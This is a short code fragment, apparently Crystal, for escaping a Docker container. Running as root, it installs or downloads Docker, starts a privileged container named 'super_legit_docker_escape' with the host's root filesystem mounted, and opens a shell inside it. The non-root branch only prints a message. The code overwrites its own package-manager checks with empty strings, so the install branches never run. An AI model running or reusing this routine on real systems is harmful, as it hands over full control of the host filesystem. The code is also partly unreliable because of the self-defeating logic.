def unix_socket_breakout
    uid=LibC.getuid
    if uid == 0
      puts("We're root, let's try and install Docker")
      apk_loc = `which apk`
      apt_loc = `which apt`
      yum_loc = `which yum`
      apk_loc = ""
      apt_loc = ""
      yum_loc =""
  
      if !apk_loc.empty?
        puts "APK install.."
        puts `apk update && apk install docker`
      elsif !apt_loc.empty?
        puts "APT install.."
        puts `apt update &&apt install docker`
      elsif !yum_loc.empty?
        puts "YUM install.."
        puts `yum install docker`
      else
        HTTP::Client.get("https://download.docker.com/linux/static/stable/x86_64/docker-18.09.3.tgz") do |response|
          File.write("./docker-18.09.3.tgz", response.body_io)
        end
        `tar xzvf ./docker-18.09.3.tgz`
      end
      puts `./docker/docker rm -f super_legit_docker_escape; ./docker/docker run -i -t -d -v /:/hostos --privileged --name super_legit_docker_escape alpine /bin/sh`
      puts "We should have started a privileged container with the host OS filesystem mounted."
      puts "Let's try to start a shell inside that container"
      system("./docker/docker exec -i -t super_legit_docker_escape /bin/sh")
    else
      puts("Not root. Let's try to use Curl")
    end
  end